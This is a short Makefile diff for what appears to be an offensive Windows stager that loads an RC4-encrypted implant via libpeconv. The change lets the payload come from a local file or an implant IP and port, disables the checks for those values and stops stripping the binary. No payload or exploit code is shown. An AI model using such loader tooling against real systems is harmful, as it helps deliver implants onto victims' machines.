@@ -13,6 +13,12 @@ ifdef RC4_KEY
   CFLAG_RC4 = -DRC4_KEY=\"$(RC4_KEY)\"
 endif
 
+ifdef IMPLANT_IP
+  CFLAG_SRC = -DIMPLANT_IP=\"$(IMPLANT_IP)\" -DIMPLANT_PORT=$(IMPLANT_PORT)
+else
+  CFLAG_SRC = -DPAYLOAD_FILE=\"$(PAYLOAD_FILE)\"
+endif
+
 CXX_x32 := i686-w64-mingw32-g++
 CXX_x64 := x86_64-w64-mingw32-g++
 AR_x86 := i686-w64-mingw32-ar
@@ -42,16 +48,16 @@ stager/cRC4.o:
 	$(CXX_x64) -c stager/cRC4.cpp -o stager/cRC4.o
 
 stager/stager.o:
-	@:$(call check_defined, IMPLANT_IP, implant serving ip)
-	@:$(call check_defined, IMPLANT_PORT, implant serving port)
+#	@:$(call check_defined, IMPLANT_IP, implant serving ip)
+#	@:$(call check_defined, IMPLANT_PORT, implant serving port)
 
-	$(CXX_x64) -c stager/stager.cpp $(CFLAGS) $(INC) -DIMPLANT_IP=\"$(IMPLANT_IP)\" -DIMPLANT_PORT=$(IMPLANT_PORT) $(CFLAG_RC4) -o stager/stager.o
+	$(CXX_x64) -c stager/stager.cpp $(CFLAGS) $(INC) $(CFLAG_SRC) $(CFLAG_RC4) -o stager/stager.o
 
 .PHONY: stager
 stager:	$(stager)
 
 $(stager): stager/cRC4.o stager/stager.o dist/libpeconv.a
-	$(CXX_x64) stager/*.o $(LDFLAGS) $(LDFLAGS2) -s -o $(stager)
+	$(CXX_x64) stager/*.o $(LDFLAGS) $(LDFLAGS2) -o $(stager)
 
 .PHONY: clean
 clean:
